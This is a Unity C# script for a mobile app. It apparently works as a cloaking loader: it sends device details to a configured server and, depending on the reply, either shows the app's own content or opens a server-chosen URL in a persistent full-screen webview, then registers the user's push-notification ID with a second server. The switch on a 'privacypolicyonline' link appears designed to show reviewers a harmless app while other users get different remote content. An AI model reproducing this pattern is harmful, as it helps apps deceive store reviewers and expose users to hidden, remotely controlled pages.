using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using UnityEngine;
using UnityEngine.UI;

public class PrivacyLoader : MonoBehaviour
{
    [SerializeField] private GameObject effectUltimate;
    [SerializeField] private GameObject spinner;
    [SerializeField] private string privacyDomainName;
    [SerializeField] private string postDomainName;

    [SerializeField] private Text processLogLable;

    [SerializeField] private bool showLog;
    [SerializeField] private bool clearePrefs;

    private const string SavedUrlKey = "Saved-Url";

    public static string UserAgentKey = "User-Agent";
    public static string[] UserAgentValue => new string[] { SystemInfo.operatingSystem, SystemInfo.deviceModel };

    class CpaObject
    {
        public Dictionary<string, object> appsflyer;
        public string referrer;
    }

    private void Start()
    {
        if(clearePrefs) PlayerPrefs.DeleteAll();

        OneSignalExtension.Initialize();

        if (Application.internetReachability == NetworkReachability.NotReachable)
        {
            ShowLog("NoInternet");
            ActiveEffect();
        }
        else
        {
            var saveLink = PlayerPrefs.GetString(SavedUrlKey, "null");
            if (saveLink == "null")
            {
                StartCoroutine(RequestsStage());
            }
            else
            {
                OpenView(saveLink);
            }
        }
    }

    IEnumerator RequestsStage()
    {
        var response = Request(privacyDomainName + $"?apps_flyer_id=");
        var delay = 9f;
        while (!response.IsCompleted && delay > 0f)
        {
            yield return new WaitForSeconds(Time.deltaTime);
            delay -= Time.deltaTime;
        }

        yield return null;

        if (!response.IsCompleted || response.IsFaulted)
        {
            if(delay > 0f) ShowLog("NJI request fail");
            else ShowLog("NJI request timeout");

            ActiveEffect();
        }
        else
        {
            var receiveBody = JObject.Parse(response.Result);

            if (receiveBody.ContainsKey("response"))
            {
                var link = receiveBody.Property("response").Value.ToString();

                if (string.IsNullOrEmpty(link))
                {
                    ShowLog("NJI link is empty");
                    ActiveEffect();
                }
                else
                {
                    if (link.Contains("privacypolicyonline"))
                    {
                        ActiveEffect();
                    }
                    else
                    {
                        OpenView(link);
                        yield return new WaitWhile(() => string.IsNullOrEmpty(OneSignalExtension.UserId));

                        string clientId = receiveBody.Property("client_id")?.Value.ToString();
                        var rec = PostRequest($"{postDomainName}/{clientId}" + $"?onesignal_player_id={OneSignalExtension.UserId}");

                        yield return new WaitForSeconds(3f);

                        PlayerPrefs.SetString(SavedUrlKey, webView.Url);
                        PlayerPrefs.Save();
                    }
                }
            }
            else
            {
                ShowLog("NJI no response");
                ActiveEffect();
            }
        }
    }

    UniWebView webView;
    private void OpenView(string url)
    {
        Screen.orientation = ScreenOrientation.AutoRotation;

        try
        {
            UniWebView.SetAllowJavaScriptOpenWindow(true);

            webView = gameObject.AddComponent<UniWebView>();
            webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
            webView.OnOrientationChanged += (view, orientation) =>
            {
                // Set full screen again. If it is now in landscape, it is 640x320.
                Invoke("ResizeView", Time.deltaTime);
            };

            webView.Load(url);
            webView.Show();
            webView.SetSupportMultipleWindows(true, true);
            webView.OnShouldClose += (view) => { return view.CanGoBack; };
        }
        catch (Exception ex)
        {
            processLogLable.text += $"\n {ex}";
        }
    }

    private void ResizeView()
    {
        webView.Frame = new Rect(0, 0, Screen.width, Screen.height);
    }

    #region requests

    public async Task<string> Request(string url)
    {
        var httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
        httpWebRequest.UserAgent = string.Join(", ", UserAgentValue);
        httpWebRequest.Headers.Set(HttpRequestHeader.AcceptLanguage, Application.systemLanguage.ToString());
        httpWebRequest.ContentType = "application/json";
        httpWebRequest.Method = "POST";

        using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
        {
            string json = JsonUtility.ToJson(new CpaObject
            {
                appsflyer = null,
                referrer = string.Empty,
            });

            streamWriter.Write(json);
        }

        var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
        using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
        {
            return await streamReader.ReadToEndAsync();
        }
    }

    public async Task<string> PostRequest(string url)
    {
        var httpWebRequest = (HttpWebRequest)WebRequest.Create(url);
        httpWebRequest.UserAgent = string.Join(", ", UserAgentValue);
        httpWebRequest.Headers.Set(HttpRequestHeader.AcceptLanguage, Application.systemLanguage.ToString());
        httpWebRequest.ContentType = "application/json";
        httpWebRequest.Method = "POST";

        using (var streamWriter = new StreamWriter(httpWebRequest.GetRequestStream()))
        {
            string json = JsonUtility.ToJson(new CpaObject
            {
                appsflyer = null,
                referrer = string.Empty,
            });

            streamWriter.Write(json);
        }

        var httpResponse = (HttpWebResponse)httpWebRequest.GetResponse();
        using (var streamReader = new StreamReader(httpResponse.GetResponseStream()))
        {
            return await streamReader.ReadToEndAsync();
        }
    }

    #endregion

    private void ActiveEffect()
    {
        StopAllCoroutines();

        effectUltimate.SetActive(true);
        spinner.SetActive(false);

        if (PlayerPrefs.HasKey(SavedUrlKey)) OneSignalExtension.Unsubscribe();
    }


    private void ShowLog(string mess)
    {
        if (showLog) processLogLable.text += (mess + '\n');
    }
}
